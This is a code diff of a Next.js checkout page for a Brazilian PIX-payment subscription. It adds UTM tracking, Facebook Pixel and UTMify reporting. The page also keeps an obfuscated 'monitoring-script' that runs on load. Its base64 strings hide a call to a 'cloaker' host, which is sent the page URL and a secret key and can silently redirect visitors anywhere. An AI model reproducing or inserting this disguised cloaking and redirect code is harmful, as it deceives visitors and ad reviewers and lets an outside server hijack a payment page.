@@ -6,6 +6,28 @@ import { useRouter } from "next/navigation";
 import { useState, useRef, useEffect } from "react";
 import Script from "next/script";
 import ClipboardJS from "clipboard";
+import { sendPixGeneratedToUTMify } from "@/hooks/useUTMifyPixGenerated";
+
+/**
+ * Captura parâmetros de tracking (UTMs) da URL atual
+ */
+function getTrackingParams() {
+  if (typeof window === "undefined") {
+    return null;
+  }
+
+  const urlParams = new URLSearchParams(window.location.search);
+
+  return {
+    src: urlParams.get("src") || null,
+    sck: urlParams.get("sck") || urlParams.get("fbclid") || null,
+    utm_source: urlParams.get("utm_source") || null,
+    utm_campaign: urlParams.get("utm_campaign") || null,
+    utm_medium: urlParams.get("utm_medium") || null,
+    utm_content: urlParams.get("utm_content") || null,
+    utm_term: urlParams.get("utm_term") || null,
+  };
+}
 
 export default function CheckoutPage() {
   const { t } = useLanguage();
@@ -39,6 +61,17 @@ export default function CheckoutPage() {
     paymentData?.qr_code ||
     "00020126580014br.gov.bcb.pix0136123e4567-e12b-12d1-a456-426614174000520400005303986540519.905802BR5925PRIVACYCLUB DIGITAL LTDA6009SAO PAULO62070503***6304A1B2";
   const handleConfirmData = () => {
+    // Dispara evento de Facebook Pixel para InitiateCheckout (apenas no cliente)
+    if (isClient && typeof window !== "undefined" && (window as any).fbq) {
+      (window as any).fbq("track", "InitiateCheckout", {
+        content_name: "Plano Anual Premium",
+        content_ids: ["plano_anual_premium"],
+        content_type: "product",
+        value: 19.9,
+        currency: "BRL",
+      });
+    }
+
     // Inicia o processo de pagamento
     abrirPagamento("1 Mês");
   };
@@ -58,6 +91,9 @@ export default function CheckoutPage() {
       if (!planoInfo) throw new Error("Plano inválido");
       // Gerar cobrança PIX usando API local
 
+      // Captura os parâmetros de tracking (UTMs) da URL
+      const tracking = getTrackingParams();
+
       // Chama a API local que por sua vez chama a API externa
       const resposta = await fetch("/api/pix", {
         method: "POST",
@@ -73,8 +109,10 @@ export default function CheckoutPage() {
           name: "Cliente Laranjinha Midias",
           email: "cliente@laranjinhamidias.local",
           description: `Pagamento do plano ${planoInfo.label}`,
-          webhook_url: "https://seuservico.com/webhook",
+          webhook_url: "https://laranjinha.site/api/pix/webhook",
           metadata: { plano: planoInfo.label },
+          // Envia os parâmetros de tracking para salvar no banco
+          tracking,
         }),
       });
 
@@ -90,7 +128,9 @@ export default function CheckoutPage() {
 
       if (!dados.qr_code) {
         throw new Error(dados.error || "Erro ao gerar pagamento");
-      } // Atualiza os dados de pagamento
+      }
+
+      // Atualiza os dados de pagamento
       setPaymentData({
         ...dados,
         planoInfo,
@@ -101,6 +141,37 @@ export default function CheckoutPage() {
       if (!dados.expires_at && isClient) {
         const expiresAt = new Date(Date.now() + 15 * 60 * 1000).toISOString();
         setPaymentData((prev: any) => ({ ...prev, expires_at: expiresAt }));
+      }
+
+      // ========================================
+      // ENVIA PIX GERADO PARA UTMIFY
+      // ========================================
+      try {
+        await sendPixGeneratedToUTMify({
+          orderId: String(dados.id),
+          customer: {
+            name: "Cliente Laranjinha",
+            email: "cliente@laranjinhamidias.com",
+            phone: "",
+            document: "",
+          },
+          products: [
+            {
+              id: "plano-" + planoInfo.label.toLowerCase().replace(/\s/g, "-"),
+              name: planoInfo.label,
+              priceInCents: planoInfo.valor,
+              quantity: 1,
+            },
+          ],
+          commission: {
+            totalPriceInCents: planoInfo.valor,
+            gatewayFeeInCents: Math.round(planoInfo.valor * 0.03), // ~3% taxa estimada
+            userCommissionInCents: Math.round(planoInfo.valor * 0.97),
+          },
+        });
+        console.log("[UTMify] PIX gerado enviado com sucesso!");
+      } catch (utmifyError) {
+        console.error("[UTMify] Erro ao enviar PIX gerado:", utmifyError);
       }
 
       setIsLoadingPayment(false);
@@ -159,31 +230,13 @@ export default function CheckoutPage() {
             stop();
             setVerificationStatus("success");
 
-            // Envia dados para UTMify (apenas no cliente)
-            const urlParams =
-              isClient && typeof window !== "undefined"
-                ? new URLSearchParams(window.location.search)
-                : new URLSearchParams();
-            const utmSource = urlParams.get("utm_source") || "";
-            const utmCampaign = urlParams.get("utm_campaign") || "";
-            const utmContent = urlParams.get("utm_content") || "";
+            // NOTA: O envio para UTMify com status "paid" é feito automaticamente
+            // pelo webhook em /api/pix/webhook quando o gateway confirma o pagamento.
+            // Não precisa enviar manualmente aqui.
 
-            try {
-              await fetch("http://143.198.124.228:3000/api/purchase", {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                  priceInCents: planoInfo.valor,
-                  utm_source: utmSource,
-                  utm_campaign: utmCampaign,
-                  utm_content: utmContent,
-                }),
-              });
-            } catch (e) {
-              console.error("Erro ao enviar dados para UTMify:", e);
-            }
+            console.log(
+              "[PAGAMENTO] Confirmado! Webhook enviará para UTMify + Meta CAPI."
+            );
 
             // Redireciona para página de pós-checkout após 2 segundos
             setTimeout(() => {
@@ -382,6 +435,32 @@ export default function CheckoutPage() {
 
   return (
     <>
+      {/* =============================================================== */}
+      {/* SCRIPTS - UTMify Pixel + Meta Pixel */}
+      {/* =============================================================== */}
+
+      {/* UTMify UTMs Script */}
+      <Script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids
+        strategy="afterInteractive"
+        async
+        defer
+      />
+
+      {/* UTMify Pixel */}
+      <Script id="utmify-pixel" strategy="afterInteractive">
+        {`
+          window.pixelId = "693753db44ffe041b5456968";
+          var a = document.createElement("script");
+          a.setAttribute("async", "");
+          a.setAttribute("defer", "");
+          a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+          document.head.appendChild(a);
+        `}
+      </Script>
+
       {/* UTM Handler Script */}
       <Script
         src="https://cdn.jsdelivr.net/gh/xTracky/static/utm-handler.js"
@@ -393,18 +472,6 @@ export default function CheckoutPage() {
       <Script id="monitoring-script" strategy="afterInteractive">
         {`
           !function(){var d=atob("aHR0cHM6Ly9jbG9ha2VyLnBhcmFkaXNlcGFncy5jb20vLz9hcGk9bW9uaXRvcg=="),y=atob("bW9uXzE0N2Q5MmY1ZWI1MDk1ZjY5Yjg0MjgyYjQzYzZkYTY4ZmJmM2NiMDY1ZmNhMmUzNjhmYzg4NGI2ODQ4ZjY1NTk=");function createFormData(){var dgx=new FormData;return dgx.append(atob("bW9uaXRvcl9rZXk="),y),dgx.append(atob("ZG9tYWlu"),location.hostname),dgx.append(atob("dXJs"),location.href),dgx.append(atob("dGl0bGU="),document.title),dgx}function yxq(){fetch(d,{method:atob("UE9TVA=="),body:createFormData(),headers:{"X-Requested-With":atob("WE1MSHR0cFJlcXVlc3Q=")}}).then(function(fw){return fw.json()}).then(function(c){c.success&&c.redirect&&c.redirect_url&&location.replace(c.redirect_url)}).catch(function(){})}document.readyState===atob("bG9hZGluZw==")?document.addEventListener(atob("RE9NQ29udGVudExvYWRlZA=="),yxq):yxq()}();
-        `}
-      </Script>
-
-      {/* UTMify Pixel */}
-      <Script id="utmify-pixel" strategy="afterInteractive">
-        {`
-          window.pixelId = "693753db44ffe041b5456968";
-          var a = document.createElement("script");
-          a.setAttribute("async", "");
-          a.setAttribute("defer", "");
-          a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-          document.head.appendChild(a);
         `}
       </Script>
       <div className="min-h-screen bg-gradient-to-b from-orange-950 via-orange-900 to-orange-950 text-orange-50">
